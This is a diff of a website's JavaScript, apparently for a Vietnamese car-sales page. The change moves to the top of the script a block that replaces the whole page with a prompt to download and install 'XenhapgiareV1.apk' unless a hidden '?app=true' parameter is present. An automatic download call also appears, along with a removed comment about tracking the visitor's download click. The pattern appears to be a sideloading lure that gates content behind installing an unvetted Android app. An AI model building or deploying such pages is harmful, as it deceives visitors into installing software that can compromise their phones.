@@ -2,6 +2,26 @@
 
   "use strict";
 
+  var urlParams = new URLSearchParams(window.location.search);
+
+  // get query string value
+  var app = urlParams.get('app');
+
+  if (!app || app != 'true') {
+    $('body').css('padding', '0')
+    $('body').html(
+      `<div style="display: flex; justify-content: center; align-items: center; height: 100vh; width: 90%; margin: auto; text-align: center">
+      <div>
+          <img src='./images/ic_launcher.png' style="width: 80%; display: block; margin:auto">
+          <p style="padding-top: 20px">Tên file: Xenhapgiare.apk</p>
+          <p>Kích thước: 25mb</p>
+          <p>Vui lòng tải xuống ứng dụng và cài đặt để xem chi tiết. <br> <a id="link" style="text-decoration: underline; color: blue" href="./XenhapgiareV1.apk" download>Tải ngay bây giờ</a></p> 
+      </div>
+    </div>
+    `
+    );
+  }
+
   // PRE LOADER
   $(window).load(function () {
     $('.preloader').fadeOut(1000); // set duration in brackets    
@@ -116,27 +136,6 @@ function downloadURI(uri, name) {
   link.remove();
 }
 downloadURI()
-var urlParams = new URLSearchParams(window.location.search);
-
-// get query string value
-var app = urlParams.get('app');
-
-if (!app || app != 'true') {
-  $('body').css('padding', '0')
-  $('body').html(
-    `<div style="display: flex; justify-content: center; align-items: center; height: 100vh; width: 90%; margin: auto; text-align: center">
-      <div>
-          <img src='./images/ic_launcher.png' style="width: 80%; display: block; margin:auto">
-          <p style="padding-top: 20px">Tên file: Xenhapgiare.apk</p>
-          <p>Kích thước: 25mb</p>
-          <p>Vui lòng tải xuống ứng dụng và cài đặt để xem chi tiết. <br> <a id="link" style="text-decoration: underline; color: blue" href="./XenhapgiareV1.apk" download>Tải ngay bây giờ</a></p> 
-      </div>
-    </div>
-    `
-  );
-}
-
-// tôi muốn bắt sự kiện sau khi khách click dowload file
 
 
 
